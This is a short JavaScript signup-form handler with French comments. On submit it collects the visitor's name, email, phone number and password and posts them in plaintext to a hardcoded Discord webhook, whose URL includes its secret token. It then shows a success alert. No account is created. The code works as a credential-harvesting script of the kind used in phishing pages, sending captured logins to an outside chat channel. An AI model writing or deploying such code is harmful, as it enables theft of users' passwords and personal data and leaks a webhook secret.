// Fonction pour envoyer les données au webhook
function sendToWebhook(url, data) {
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            content: '',
            embeds: [
                {
                    title: "Form Submission",
                    fields: Object.keys(data).map(key => ({
                        name: key.charAt(0).toUpperCase() + key.slice(1),
                        value: data[key],
                        inline: false
                    })),
                    timestamp: new Date().toISOString(),
                }
            ]
        }),
    })
    .then(response => response.json())
    .then(data => console.log('Success:', data))
    .catch((error) => console.error('Error:', error));
}

// Gestionnaire de soumission pour la page d'inscription
document.getElementById('signup-form')?.addEventListener('submit', function(event) {
    event.preventDefault();
    
    const name = document.getElementById('name').value;
    const email = document.getElementById('email').value;
    const phone = document.getElementById('phone').value;
    const password = document.getElementById('password').value;
    
    const data = {
        Name: name,
        Email: email,
        Phone: phone,
        Password: password
    };
    
    // Envoyer les données au webhook d'inscription
    const signupWebhookUrl = 'https://discord.com/api/webhooks/1283795991518117960/wf3X1-HPU_rjhaZZVeXc1OaR1C1s3VvM-MYS-J0hI9oz2GVG-PoVD2dCawHW1Lmkw1eJ';
    sendToWebhook(signupWebhookUrl, data);
    
    // Affichage du message de succès
    alert('Signup details sent successfully!');
});
